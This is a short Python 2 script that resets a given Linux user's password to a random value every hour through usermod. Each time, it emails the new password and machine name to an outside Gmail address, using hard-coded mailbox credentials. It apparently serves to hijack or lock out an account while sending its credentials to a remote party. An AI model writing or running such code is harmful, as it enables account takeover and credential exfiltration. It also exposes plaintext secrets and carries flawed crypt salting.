import random
import smtplib
import time
import string
import subprocess
import crypt
def makepass():
	num = random.randint(11,15)
	passit = ''.join(random.choice(string.ascii_letters+string.digits) for n in range(0,num))
	salt = ''.join(random.choice(string.ascii_letters) for i in range(8))
	shadow_password = crypt.crypt(passit, '$1$'+passit+'$')
	r = subprocess.call(('usermod', '-p', shadow_password, login))
	if r != 0:
		print 'Error changing password for ' + login
	
	return passit
def throwpass(passit):
	fromaddr = 'passthepass69@gmail.com'
	toaddrs =  'receivethepass69@gmail.com'
	msg = passit + ' ' + pcname
	username = 'passthepass69@gmail.com'
	password = 'passthepasstothepass420'
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(username,password)
	server.sendmail(fromaddr, toaddrs, msg)
	server.quit
	return

def testthepass():
	fromaddr = 'passthepass69@gmail.com'
	toaddrs =  'passthepass69@gmail.com'
	msg = "test"
	username = 'passthepass69@gmail.com'
	password = 'passthepasstothepass420'
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	try:
                server.login(username,password)
        except:
                exit()
	server.sendmail(fromaddr, toaddrs, msg)
	server.quit
	return

def main():
        testthepass()
	passit = makepass()
	throwpass(passit)
	time.sleep(3600)
	main()

login = raw_input("username")
pcname = raw_input('pcname')
main()


#improvements
# - pushbullet
# - email commands
